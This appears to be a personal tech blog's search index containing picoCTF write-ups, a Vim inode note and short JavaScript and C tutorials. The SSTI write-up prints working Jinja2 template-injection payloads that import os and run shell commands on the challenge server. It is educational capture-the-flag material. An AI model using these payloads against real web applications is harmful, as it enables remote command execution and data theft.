bigger exploits.\nAlso, remember: it’s okay to feel lost at first. Every expert you admire in Linux, development, or security once stared at a disassembly dump and thought, “What on earth is this?”\nThe best advice? Keep poking, keep experimenting, and don’t be afraid to Google shamelessly.\n","permalink":"/posts/picoctf-writeup-binary-exploit/","summary":"\u003ch2 id=\"binary-exploitation-challenge-pie--function-hijacking-in-picoctf\"\u003eBinary Exploitation Challenge (PIE \u0026amp; Function Hijacking in picoCTF)\u003c/h2\u003e\n\u003cp\u003eI’ve always been fascinated by low-level programming and security, but up until now I hadn’t really tried a \u003cstrong\u003ebinary exploitation challenge\u003c/strong\u003e. Recently, I stumbled upon \u003ca href=\"https://play.picoctf.org/practice/challenge/490\"\u003ethis picoCTF challenge\u003c/a\u003e called \u003cem\u003e“rescue-float”\u003c/em\u003e — and let me tell you, it was a mix of confusion, discovery, and a little bit of victory at the end.\u003c/p\u003e\n\u003cp\u003eThis post is a casual walkthrough of how I approached it as a beginner. If you’re into Linux, development, or cybersecurity, you’ll probably find this fun (or at least relatable if you remember your first binary exploitation adventure).\u003c/p\u003e","title":"PicoCTF Writeup #490"},{"content":"PicoCTF Writeup – Forensics Disk Image Challenge: Disk, disk, sleuth!\nDescription: Can you find the flag in this disk image? Download the disk image here.\nFirst Thoughts This challenge was tagged forensics, which usually means poking around filesystems, memory dumps, or raw disk images. The goal is to extract hidden information — in this case, the flag.\nI grabbed the disk image (disko-1.dd) and started experimenting.\nInitial Attempts My first instinct was to take a look at the raw hex using xxd:\nxxd disko-1.dd | less I did see some readable text, like:\nThis is not a bootable disk. Please insert a bootable floppy and .. press any key to try to gain... But nothing that looked like a flag. At this point, I also tried mounting the image as a loop device, but it didn’t yield anything useful either.\nSwitching Gears Since the flag format is predictable (picoCTF{...}), a simpler approach came to mind: just dump all printable text and grep for the flag.\nOn Linux, strings is perfect for this:\nstrings disko-1.dd | grep -i picoCTF And sure enough, the flag popped out.\nThe Flag picoCTF{1t5_ju5t_4_5tr1n9_c63b02ef} Takeaways Forensics challenges don’t always require fancy tools — sometimes the classic Unix pipeline (strings | grep) is all you need. Recognizing patterns (like picoCTF{}) can save you from wasting time on dead ends. Always start simple before diving into heavy forensic frameworks. ","permalink":"/posts/picoctf-writeup-disko-1/","summary":"\u003ch2 id=\"picoctf-writeup--forensics-disk-image\"\u003ePicoCTF Writeup – Forensics Disk Image\u003c/h2\u003e\n\u003cp\u003eChallenge: \u003ca href=\"https://play.picoctf.org/practice/challenge/505\"\u003eDisk, disk, sleuth!\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\nCan you find the flag in this disk image?\nDownload the disk image \u003ca href=\"https://artifacts.picoctf.net/c/536/disko-1.dd.gz\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"first-thoughts\"\u003eFirst Thoughts\u003c/h2\u003e\n\u003cp\u003eThis challenge was tagged \u003cstrong\u003eforensics\u003c/strong\u003e, which usually means poking around filesystems, memory dumps, or raw disk images. The goal is to extract hidden information — in this case, the flag.\u003c/p\u003e\n\u003cp\u003eI grabbed the disk image (\u003ccode\u003edisko-1.dd\u003c/code\u003e) and started experimenting.\u003c/p\u003e\n\u003ch2 id=\"initial-attempts\"\u003eInitial Attempts\u003c/h2\u003e\n\u003cp\u003eMy first instinct was to take a look at the raw hex using \u003ccode\u003exxd\u003c/code\u003e:\u003c/p\u003e","title":"PicoCTF Writeup #505"},{"content":"PicoCTF Writeup – Server-Side Template Injection (SSTI) Recently, I played around with a PicoCTF challenge 492. The challenge looked like a simple web app that lets you \u0026ldquo;announce whatever you want.\u0026rdquo; Naturally, I fired up my terminal and started poking at it with curl. By the way, we can also visit the website and experiment with the form instead.\ncurl -X GET http://rescued-float.picoctf.net:49878/announce -i Response:\nHTTP/1.1 405 METHOD NOT ALLOWED Allow: POST, OPTIONS Looks like only POST is allowed, so I retried with:\ncurl -X POST http://rescued-float.picoctf.net:49878/announce -i This time, I got a 200 OK. Sweet — we can actually interact with the app.\nFirst Thoughts The description said:\n“I made a cool website where you can announce whatever you want! I heard templating is a cool and modular way to build web apps!”\nThat last line screamed templating. My first instinct was to try some basic XSS. Sure enough:\n\u0026lt;script\u0026gt;alert(\u0026#34;HELO\u0026#34;)\u0026lt;/script\u0026gt; triggered an alert box. Nice, but XSS wasn’t the way to the flag.\nPivot to SSTI The title of the challenge hinted at Server-Side Template Injection (SSTI). From the headers I noticed the app was running Werkzeug (Python/3.8). That strongly suggested Jinja2 templating under the hood.\nI tested with some Jinja syntax:\n{{}} and got an Internal Server Error. That confirmed I was on the right track — this was a template engine at work.\nDigging Deeper Here’s where I hit a wall. I’d never really done an SSTI attack before. After some research, I learned about Python’s MRO (Method Resolution Order) and how it could be abused to reach Python internals, including modules like os.\nTurns out you can chain through Jinja’s builtins and reach Python’s os library. Once you can execute system commands, it’s game over.\nPayload to list files:\n{{request.application.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()}} That revealed a file named flag.\nPayload to read it:\n{{request.application.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag\u0026#39;).read()}} And boom — got the flag.\nThe Flag picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823} Takeaways Don’t stop at XSS — sometimes it’s just a red herring. Jinja2 + careless input handling = a playground for SSTI. The Method Resolution Order (MRO) trick is incredibly powerful when exploring Python internals. This was my first real SSTI exploit, and it was a fun rabbit hole to fall into. Definitely a good reminder of how dangerous improper template handling can be.\n","permalink":"/posts/picoctf-writeup-ssti/","summary":"\u003ch2 id=\"picoctf-writeup--server-side-template-injection-ssti\"\u003ePicoCTF Writeup – Server-Side Template Injection (SSTI)\u003c/h2\u003e\n\u003cp\u003eRecently, I played around with a PicoCTF \u003ca href=\"https://play.picoctf.org/practice/challenge/492\"\u003echallenge 492\u003c/a\u003e. The challenge looked like a simple web app that lets you \u0026ldquo;announce whatever you want.\u0026rdquo; Naturally, I fired up my terminal and started poking at it with \u003ccode\u003ecurl\u003c/code\u003e. By the way, we can also visit the website and experiment with the form instead.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl -X GET http://rescued-float.picoctf.net:49878/announce -i\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eResponse:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eHTTP/1.1 405 METHOD NOT ALLOWED\nAllow: POST, OPTIONS\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eLooks like only \u003ccode\u003ePOST\u003c/code\u003e is allowed, so I retried with:\u003c/p\u003e","title":"PicoCTF Writeup #492"},{"content":"While writing a custom version of the tail -f command in C, I stumbled upon an interesting behavior in the Vim/Neovim text editors. The purpose of the program is to continuously print any new data appended to the end of a file—just like tail -f, which is commonly used for watching log files.\nIn my implementation, I have something like this:\nconst char *filename = argv[1]; int fd = open(filename, O_RDONLY); if (fd == -1) { perror(\u0026#34;open\u0026#34;); return 1; } The open() function, provided by #include \u0026lt;fcntl.h\u0026gt;, returns a file descriptor—a small, nonnegative integer that acts as an index into the process’s table of open file descriptors.\nIf you check the man page for open using man 2 open, you’ll find this line:\nEach open() of a file creates a new open file description; thus, there may be multiple open file descriptions corresponding to a file inode. The key concept here is the inode. When I call open, it gives me a file descriptor that maps to a particular file inode.\nAfter calling open, I use the returned file descriptor to monitor any changes made to the file\u0026rsquo;s content.\nWhen I ran the program and used echo to append lines to the file, everything worked as expected. The program picked up the changes and printed them out immediately.\nHowever, things got weird when I tried editing the file using Neovim. I added a line at the end and saved it.\nNothing happened.\nMy program didn’t detect any changes. But when I used nano to modify the file, the output appeared as expected. This raised a question: what exactly makes Vim and Neovim behave differently when saving changes to a file?\nSince my program keeps track of the file\u0026rsquo;s inode, I started wondering: when Vim/Neovim saves changes to a file, does it do something that affects the inode?\nEditing a file with Vim/Neovim doesn’t change the filename, so I checked whether it modifies the inode in some way.\nI used ls -li to inspect the file’s inode before and after editing:\n$ touch a.txt $ ls -li 12085572 -rw-rw-r-- 1 deni deni 0 Jun 13 18:23 a.txt Then I made some changes using Neovim:\n$ nvim a.txt $ ls -li 12085597 -rw-rw-r-- 1 deni deni 76 Jun 13 18:24 a.txt Yup, the inode changed.\nThat explains why my program didn’t detect the changes. It was still watching the original file, whose inode no longer existed.\nFrom the Vim manual:\n\u0026#39;backup\u0026#39; \u0026#39;bk\u0026#39;\tboolean\t(default off) global {not in Vi} Make a backup before overwriting a file. Leave it around after the file has been successfully written. If you do not want to keep the backup file, but you do want a backup while the file is being written, reset this option and set the \u0026#39;writebackup\u0026#39; option (this is the default). If you do not want a backup file at all reset both options (use this if your file system is almost full). See the |backup-table| for more explanations. When the \u0026#39;backupskip\u0026#39; pattern matches, a backup is not made anyway. When \u0026#39;patchmode\u0026#39; is set, the backup may be renamed to become the oldest version of a file. ... \u0026#39;backupcopy\u0026#39; \u0026#39;bkc\u0026#39;\tstring\t(Vi default for Unix: \u0026#34;yes\u0026#34;, otherwise: \u0026#34;auto\u0026#34;) global {not in Vi} When writing a file and a backup is made, this option tells how it\u0026#39;s done. This is a comma separated list of words. The main values are: \u0026#34;yes\u0026#34;\tmake a copy of the file and overwrite the original one \u0026#34;no\u0026#34;\trename the file and write a new one \u0026#34;auto\u0026#34;\tone of the previous, what works best So yeah, since Vim/Neovim has \u0026lsquo;backup\u0026rsquo; set to off by default, it doesn\u0026rsquo;t create a backup and overwrite the original file directly. Instead, it renames the original and writes a new file with the same name—resulting in a new inode.\nAfter realizing that, I modified my program to re-check the file\u0026rsquo;s inode in case it changes.\nQuite an interesting experience, to say the least.\nStay safe.\nReferences:\nhttps://vimdoc.sourceforge.net/htmldoc/options.html https://man7.org/linux/man-pages/man2/open.2.html ","permalink":"/posts/vim-backup-copy/","summary":"\u003cp\u003eWhile writing a custom version of the \u003ccode\u003etail -f\u003c/code\u003e command in C, I stumbled upon an\ninteresting behavior in the Vim/Neovim text editors. The purpose of the program is\nto continuously print any new data appended to the end of a file—just like \u003ccode\u003etail -f\u003c/code\u003e,\nwhich is commonly used for watching log files.\u003c/p\u003e\n\u003cp\u003eIn my implementation, I have something like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#c678dd\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#e5c07b\"\u003echar\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#e06c75\"\u003efilename\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003eargv\u003c/span\u003e[\u003cspan style=\"color:#d19a66\"\u003e1\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e5c07b\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003efd\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#61afef;font-weight:bold\"\u003eopen\u003c/span\u003e(\u003cspan style=\"color:#e06c75\"\u003efilename\u003c/span\u003e, \u003cspan style=\"color:#e06c75\"\u003eO_RDONLY\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#c678dd\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#e06c75\"\u003efd\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#d19a66\"\u003e1\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#61afef;font-weight:bold\"\u003eperror\u003c/span\u003e(\u003cspan style=\"color:#98c379\"\u003e\u0026#34;open\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#c678dd\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#d19a66\"\u003e1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThe \u003ccode\u003eopen()\u003c/code\u003e function, provided by \u003ccode\u003e#include \u0026lt;fcntl.h\u0026gt;\u003c/code\u003e, returns a file descriptor—a\nsmall, nonnegative integer that acts as an index into the process’s table of\nopen file descriptors.\u003c/p\u003e","title":"Vim Backup-Copy"},{"content":"Here I will show you a simple way to generate a ranged random integer number in javascript. Since javascript doesn\u0026rsquo;t have built in function to generate ranged integer number, we will create one.\nfunction randInt(left, right) { return Math.floor(Math.random() * (right - left + 1)) + left; } And that\u0026rsquo;s it, this is just me passing by and dropping some code snippets.\nSee you later.\nStay safe!\n","permalink":"/posts/randint-js/","summary":"\u003cp\u003eHere I will show you a simple way to generate a ranged random\ninteger number in javascript. Since javascript doesn\u0026rsquo;t have built in\nfunction to generate ranged integer number, we will create one.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#c678dd\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003erandInt\u003c/span\u003e(\u003cspan style=\"color:#e06c75\"\u003eleft\u003c/span\u003e, \u003cspan style=\"color:#e06c75\"\u003eright\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#c678dd\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e5c07b\"\u003eMath\u003c/span\u003e.\u003cspan style=\"color:#e06c75\"\u003efloor\u003c/span\u003e(\u003cspan style=\"color:#e5c07b\"\u003eMath\u003c/span\u003e.\u003cspan style=\"color:#e06c75\"\u003erandom\u003c/span\u003e() \u003cspan style=\"color:#56b6c2\"\u003e*\u003c/span\u003e (\u003cspan style=\"color:#e06c75\"\u003eright\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e-\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003eleft\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#d19a66\"\u003e1\u003c/span\u003e)) \u003cspan style=\"color:#56b6c2\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003eleft\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAnd that\u0026rsquo;s it, this is just me passing by and dropping some code snippets.\u003c/p\u003e\n\u003cp\u003eSee you later.\u003c/p\u003e\n\u003cp\u003eStay safe!\u003c/p\u003e","title":"Generate Ranged Random Integer in Javascript"},{"content":"Merging pdf files in Linux is really simple, you can use a command line called pdfunite.\nOpen a terminal and type the following\npdfunite --help in my system, it prints\npdfunite version 24.06.0 Copyright 2005-2024 The Poppler Developers - http://poppler.freedesktop.org Copyright 1996-2011, 2022 Glyph \u0026amp; Cog, LLC Usage: pdfunite [options] \u0026lt;PDF-sourcefile-1\u0026gt;..\u0026lt;PDF-sourcefile-n\u0026gt; \u0026lt;PDF-destfile\u0026gt; -v : print copyright and version info -h : print usage information -help : print usage information --help : print usage information -? : print usage information Let\u0026rsquo;s say we want to merge three pdf files head.pdf, body.pdf, and foot.pdf into one file named all.pdf. Using pdfunite we can effortlessly merge all those pdf files like so\npdfunite head.pdf body.pdf foot.pdf all.pdf And that\u0026rsquo;s literally the only thing we need to do to merge all those pdf files into one single file, the order of the merged file would follow the order in the source file, so the above command will resulted a pdf file with the following order head.pdf, body.pdf, foot.pdf.\nStay safe!\n","permalink":"/posts/merge-pdf-in-linux-pdfunite/","summary":"\u003cp\u003eMerging pdf files in Linux is really simple, you can use a\ncommand line called \u003ccode\u003epdfunite\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eOpen a terminal and type the following\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epdfunite --help\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ein my system, it prints\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epdfunite version 24.06.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCopyright 2005-2024 The Poppler Developers - http://poppler.freedesktop.org\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCopyright 1996-2011, \u003cspan style=\"color:#d19a66\"\u003e2022\u003c/span\u003e Glyph \u0026amp; Cog, LLC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUsage: pdfunite \u003cspan style=\"color:#56b6c2\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#56b6c2\"\u003e]\u003c/span\u003e \u0026lt;PDF-sourcefile-1\u0026gt;..\u0026lt;PDF-sourcefile-n\u0026gt; \u0026lt;PDF-destfile\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -v             : print copyright and version info\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -h             : print usage information\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -help          : print usage information\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  --help         : print usage information\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -?             : print usage information\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eLet\u0026rsquo;s say we want to merge three pdf files \u003ccode\u003ehead.pdf\u003c/code\u003e, \u003ccode\u003ebody.pdf\u003c/code\u003e, and \u003ccode\u003efoot.pdf\u003c/code\u003e into\none file named \u003ccode\u003eall.pdf\u003c/code\u003e. Using \u003ccode\u003epdfunite\u003c/code\u003e we can effortlessly merge all those pdf\nfiles like so\u003c/p\u003e","title":"Merge Pdf in Linux using pdfunite"},{"content":"The idea is simple.\nFirst, disable the default event handler for right click in the browser.\nSecond, create a custom event handler for right click event.\nImplementing the first idea, we can do something like the following.\nwindow.addEventListener(\u0026#34;contextmenu\u0026#34;, (event) =\u0026gt; { event.preventDefault(); }); from here we can easily add any custom code for event handler to our liking, here I will just log \u0026ldquo;Right Click detected!\u0026rdquo; into the console.\nwindow.addEventListener(\u0026#34;contextmenu\u0026#34;, (event) =\u0026gt; { event.preventDefault(); console.log(\u0026#34;Right Click detected!\u0026#34;); }); You can create additional html elements and put it into the window to act as the replacement for the default context menu.\nAnyway, that\u0026rsquo;s it for now.\nStay safe!\n","permalink":"/posts/replicating-right-click-behavior-using-vanilla-javascript/","summary":"\u003cp\u003eThe idea is simple.\u003c/p\u003e\n\u003cp\u003eFirst, disable the default event handler for right click in the browser.\u003c/p\u003e\n\u003cp\u003eSecond, create a custom event handler for right click event.\u003c/p\u003e\n\u003cp\u003eImplementing the first idea, we can do something like the following.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e5c07b\"\u003ewindow\u003c/span\u003e.\u003cspan style=\"color:#e06c75\"\u003eaddEventListener\u003c/span\u003e(\u003cspan style=\"color:#98c379\"\u003e\u0026#34;contextmenu\u0026#34;\u003c/span\u003e, (\u003cspan style=\"color:#e06c75\"\u003eevent\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e06c75\"\u003eevent\u003c/span\u003e.\u003cspan style=\"color:#e06c75\"\u003epreventDefault\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e});\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003efrom here we can easily add any custom code for event handler\nto our liking, here I will just log \u0026ldquo;Right Click detected!\u0026rdquo; into\nthe console.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e5c07b\"\u003ewindow\u003c/span\u003e.\u003cspan style=\"color:#e06c75\"\u003eaddEventListener\u003c/span\u003e(\u003cspan style=\"color:#98c379\"\u003e\u0026#34;contextmenu\u0026#34;\u003c/span\u003e, (\u003cspan style=\"color:#e06c75\"\u003eevent\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e06c75\"\u003eevent\u003c/span\u003e.\u003cspan style=\"color:#e06c75\"\u003epreventDefault\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e06c75\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#e06c75\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#98c379\"\u003e\u0026#34;Right Click detected!\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e});\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eYou can create additional html elements and put it into the window\nto act as the replacement for the default context menu.\u003c/p\u003e","title":"Replicating Right Click Behavior using Vanilla Javascript"},{"content":"Promise has three different states: pending, resolve, and reject.\nWhen you first create a promise, it will be in pending state. This promise can be either \u0026ldquo;fulfilled\u0026rdquo; thus it will be resolved or it can be \u0026ldquo;rejected\u0026rdquo; thus it will be rejected.\nIn other word, if promise resulted in success it resolve, else it reject.\nTo create a promise in javascript is really simple.\nconst myPromise = new Promise(function (resolve, reject) { // do something }); What you do inside the promise will decide whether it will resolve or reject.\nEither way, the promise will return the value inside the resolve or reject function.\nconst myPromise = new Promise(function (resolve, reject)) { // this promise will resolve if 8 is an even number if (8 % 2 === 0) resolve(\u0026#34;8 is even\u0026#34;); else reject(\u0026#34;8 is not even\u0026#34;); } After you create a promise, it\u0026rsquo;s time to consume it. To do that, use the then, catch, and finally sequence like so:\nmyPromise .then(function (result) { // do something with resolved value }) .catch(function (error) { // do something with rejected value }) .finally(function () { // do the cleaning }); And that\u0026rsquo;s how you use promise in javascript.\nTo deepen your understanding about promise in javascript, you can read this awesome article from javascript.info\nAnyway, see you on another one.\nStay safe!\n","permalink":"/posts/promise-simplified-js/","summary":"\u003cp\u003ePromise has three different states: pending, resolve, and reject.\u003c/p\u003e\n\u003cp\u003eWhen you first create a promise, it will be in pending state. This\npromise can be either \u0026ldquo;fulfilled\u0026rdquo; thus it will be resolved or it can\nbe \u0026ldquo;rejected\u0026rdquo; thus it will be rejected.\u003c/p\u003e\n\u003cp\u003eIn other word, if promise resulted in success it resolve, else it reject.\u003c/p\u003e\n\u003cp\u003eTo create a promise in javascript is really simple.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#c678dd\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003emyPromise\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#c678dd\"\u003enew\u003c/span\u003e \u003cspan style=\"color:#e5c07b\"\u003ePromise\u003c/span\u003e(\u003cspan style=\"color:#c678dd\"\u003efunction\u003c/span\u003e (\u003cspan style=\"color:#e06c75\"\u003eresolve\u003c/span\u003e, \u003cspan style=\"color:#e06c75\"\u003ereject\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#7f848e\"\u003e// do something\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#7f848e\"\u003e\u003c/span\u003e});\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWhat you do inside the promise will decide whether it will resolve or reject.\u003c/p\u003e","title":"Javascript Promise Simplified"},{"content":"In this article we will build a dummy file watcher using C programming language.\nWe say dummy file watcher because to build a proper file watcher, we need to utilize os internal features which is a bit more complex.\nInstead, we will create an infinite loop that checks a given directory every 0.5 second and see if something has changed.\nFirst thing we need to do is to create a function that tells if something has changed in a given directory.\nIn order to do that, we will check the st_ctime property from each file in a given directory. Which is a property that tells when was the last time the file has been modified.\nSo, we will first list all the st_ctime property from each file and then stored it in an array, after that, every 500ms we will check all the files' st_ctime property and see if something has changed.\nHere is the full code to do just that, it will print \u0026quot;Something has changed, I can feel it...\\n\u0026quot; whenever something changed in the given directory.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char* argv[]) { if (argc != 2) { fprintf(stderr, \u0026#34;syntax: prog \u0026lt;directory\u0026gt;\\n\u0026#34;); return 1; } DIR* dp; unsigned int fdl[64]; struct dirent* ep; struct stat st; unsigned int c = 0; int setchg = 0; dp = opendir(argv[1]); if (dp == NULL) { perror(\u0026#34;opendir\u0026#34;); return 1; } // store every file\u0026#39;s st_ctime property into an array while (ep = readdir(dp)) { stat(ep-\u0026gt;d_name, \u0026amp;st); fdl[c++] = st.st_ctime; } // monitoring loop while (1) { c = 0; usleep(500000); dp = opendir(argv[1]); while ((ep = readdir(dp)) \u0026amp;\u0026amp; c \u0026lt; 64) { stat(ep-\u0026gt;d_name, \u0026amp;st); if (fdl[c] != st.st_ctime) { // if a file was modified or deleted or there is a new file setchg = 1; // the previous array and the current array will differ } fdl[c++] = st.st_ctime; } if (setchg) { printf(\u0026#34;Something has changed, I can feel it...\\n\u0026#34;); setchg = 0; } } closedir(dp); return 0; } The code is not perfect and needs a lot of improvement, for example it can only monitor up to 64 files. I will leave it to you to improve the code.\nStay safe!\n","permalink":"/posts/dummy-file-watcher-c/","summary":"\u003cp\u003eIn this article we will build a dummy file watcher using C programming\nlanguage.\u003c/p\u003e\n\u003cp\u003eWe say dummy file watcher because to build a proper file watcher, we\nneed to utilize os internal features which is a bit more complex.\u003c/p\u003e\n\u003cp\u003eInstead, we will create an infinite loop that checks a given directory\nevery 0.5 second and see if something has changed.\u003c/p\u003e\n\u003cp\u003eFirst thing we need to do is to create a function that tells if something\nhas changed in a given directory.\u003c/p\u003e","title":"Dummy File Watcher in C"},{"content":"In this short article we will review pointers in C programming language, if you are new to this kind of topic please read the tutorial of pointers for beginners first, try this tutorial for example.\nDefining Pointer There are several ways to define a pointer in C.\nint* p; int x = 5; p = \u0026amp;x; // p pointer to address x we can assign the address right away like so\nint x = 5; int* p = \u0026amp;x; Dereferencing Pointer Use * to 